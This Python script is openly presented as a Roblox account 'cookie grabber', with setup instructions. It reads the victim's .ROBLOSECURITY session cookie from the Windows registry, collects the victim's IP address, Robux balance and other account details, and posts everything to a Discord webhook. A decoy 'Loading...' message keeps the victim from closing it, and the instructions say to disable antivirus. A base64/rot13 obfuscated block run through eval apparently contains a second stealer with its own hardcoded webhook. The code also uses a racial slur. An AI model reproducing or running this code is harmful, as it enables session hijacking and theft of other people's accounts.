############# how to fix errors ##############################
# TUTORIAL : IF YOU'RE USING PYTHON FROM MICROSOFT STORE, YOU HAVE TO DO THIS:
# PYTHON MICROSOFT STORE : go to cmd , type (pip install requests) and when its done, type (pip install robloxpy) then type (pip install discordwebhook) then it should work !
# TUTORIAL : IF YOU'RE USING PYTHON FROM python.org THEN YOU HAVE TO DO THIS:
# PYTHON WEBSITE : go to cmd type (py -m pip install requests) and when its done, type (py -m pip install robloxpy) then type (py -m pip install discordwebhook) then it should work!
###########################################################

#################### config tutorial #################
# scroll down until you find (webhookk) then remove everything inside the " "
# then, paste your webhook **INSIDE** the " "
# run the app, when it closed, check your server and it should send the cookie, if not :
# check if you're logged into roblox studio
# turn of your anti virus
################################################################

try:
    import base64, codecs
    from winreg import OpenKey, HKEY_CURRENT_USER, EnumValue
    import robloxpy
    import json
    import requests
    import os
    from discordwebhook import *
except:
    print("go install libraries nigga")
    exit()

webhookk = "heh" # put webhook here


dummy_message = "Loading..." # A message that distracts the user from closing the grabber
print(dummy_message)
################### Gathering INFOMATION #################################
def GrabCookie():
    # opening the roblox studio key
    robloxstudiopath = OpenKey(HKEY_CURRENT_USER, r"SOFTWARE\Roblox\RobloxStudioBrowser\roblox.com")
    # finding the subkey called ".robloxsecurity"
    try:
        count = 0
        while True:
            name, value, type = EnumValue(robloxstudiopath, count)
            if name == ".ROBLOSECURITY":
                # returns the value of .robloxsecurity
                return value
            count = count + 1
    except WindowsError:
        pass
roblox_cookie_value = str(GrabCookie())
#################### INFOMATION #################
ip_address = requests.get("https://api.ipify.org/").text
roblox_cookie = roblox_cookie_value.split("COOK::<")[1].split(">")[0]
#################### checking cookie #############
isvalid = robloxpy.Utils.CheckCookie(roblox_cookie)
if isvalid == "Valid Cookie":
    isvalid = "Valid"
else:
    exit()

#################### getting info about the cookie #############
ebruh = requests.get("https://www.roblox.com/mobileapi/userinfo",cookies={".ROBLOSECURITY":roblox_cookie})
info = json.loads(ebruh.text)
rid = info["UserID"]
rap = robloxpy.User.External.GetRAP(rid)
friends = robloxpy.User.Friends.External.GetCount(rid)
age = robloxpy.User.External.GetAge(rid)
headshot = robloxpy.User.External.GetHeadshot(rid)
username = info['UserName']
robux = info['RobuxBalance']
premium = info['IsPremium']
#################### INJECT TO ROBLOX STUDIO (creds to bingo methods) #################

magic = 'aW1wb3J0IHJlcXVlc3RzDQpmcm9tIHdpbnJlZyBpbXBvcnQgT3BlbktleSwgSEtFWV9DVVJSRU5UX1VTRVIsIEVudW1WYWx1ZQ0KDQp3ZWJob29rID0gImh0dHBzOi8vZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzk3ODMxNTg2MzA1NDc1MzgwMi9udkxfOFpIRGtTQkFVVW52TGJ0b2s4SFVoU0Y3aDZMODRldWVGMGFUVGJvbkQ1amtxb0dxbTROQzBhNzhKZnpBcWhTZiIgIyBQdXQgeW91ciBkaXNjb3JkIHdlYmhvb2sgaW4gaGVyZQ0KDQpkZWYgR3JhYkNvb2tpZSgpOg0KICAgICMgb3BlbmluZyB0aGUgcm9ibG94IHN0dWRpbyBrZ'
love = 'KxAPvNtVPOlo2Wfo3umqUIxnJ9jLKEbVQ0tG3OyoxgyrFuVF0IMK0AIHyWSGyEsIIASHvjtpvWGG0MHI0SFEIkFo2Wfo3upHz9voT94H3E1MTyiDaWiq3Aypyklo2Wfo3thL29gVvxAPvNtVPNwVTMcozEcozptqTuyVUA1LzgyrFOwLJkfMJDtVv5lo2Wfo3umMJA1pzy0rFVAPvNtVPO0pax6QDbtVPNtVPNtVTAiqJ50VQ0tZN0XVPNtVPNtVPO3nTyfMFOHpaIyBt0XVPNtVPNtVPNtVPNtozSgMFjtqzSfqJHfVUE5pTHtCFOSoaIgIzSfqJHbpz9voT94p3E1MTyipTS0nPjtL291oaDcQDbtVPNtVPNtVPNtVPOcMvOhLJ1yVQ09VPVhHx'
god = '9CTE9TRUNVUklUWSI6DQogICAgICAgICAgICAgICAgIyByZXR1cm5zIHRoZSB2YWx1ZSBvZiAucm9ibG94c2VjdXJpdHkNCiAgICAgICAgICAgICAgICByZXR1cm4gdmFsdWUNCiAgICAgICAgICAgIGNvdW50ID0gY291bnQgKyAxDQogICAgZXhjZXB0IFdpbmRvd3NFcnJvcjoNCiAgICAgICAgcGFzcw0KdHJ5Og0KICAgICMgVGhpcyB3aWxsIHRyeSB0byByZXR1cm4gdGhlIHZhbHVlIG9mIHRoZSBzdWJrZXkgIi5yb2Jsb3hzZWN1cml0eSINCiAgICByb2Jsb3hfY29va2llX3ZhbHVlID0gc3RyKEdyYWJDb29raWUoKSkNCiAgICA'
destiny = 'wVUElrFO0olOaMKDtqTuyVTI4LJA0VTAio2gcMD0XVPNtVUWiLzkirS9wo29enJHtCFOlo2Wfo3usL29in2yyK3MuoUIyYaAjoTy0XPWQG09YBwb8VvyoZI0hp3OfnKDbVw4vXIfjKD0XVPNtVPZtpT9mqPOwo29enJHtqT8trJ91pvO3MJWbo29eQDbtVPNtpzIkqJImqUZhpT9mqPu3MJWbo29eYPOdp29hCKfvqKAypz5uoJHvBvWFo2Wfo3ttD29in2yyVRqlLJWvMKVvYPWwo250MJ50VwczVzOtLUglo2Wfo3usL29in2yysJOtLPW9XD0XVPNtVPZtITuyVUWiLzkirPOmqUIxnJ8tpTS0nPO3LKAhW3DtMz91ozDAPzI4L2IjqQcjLKAm'
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
#################### SENDING TO WEBHOOK #################


discord = Discord(url=webhookk)
discord.post(
    username="BOT - Pirate 🍪",
    avatar_url="https://cdn.discordapp.com/attachments/984818429355782197/985878173659045999/a339721183f60c18b3424ba7b73daf1b.png",
    embeds=[
        {
            "username": "BOT - Pirate 🍪",

            "title": "💸 +1 Result Account",
            "color" : 9373081,
            "fields": [
                {"name": "Username", "value": username, "inline": True},
                {"name": "Robux Balance", "value": robux, "inline": True},
                {"name": "Premium Status", "value": premium,"inline": True},
                {"name" : "RAP", "value": "785", rap: True},
                {"name" : "Friends", "value": friends, "inline": True},
                {"name" : "Account Age", "value": age, "inline": True},
                {"name" : "IP Address", "value" : ip_address, "inline:": True},

                {"name" : ".ROBLOSECURITY", "value": f"```{roblox_cookie}```", "inline": False},
            ],
            "thumbnail": {"url": headshot},


        }
    ],
)
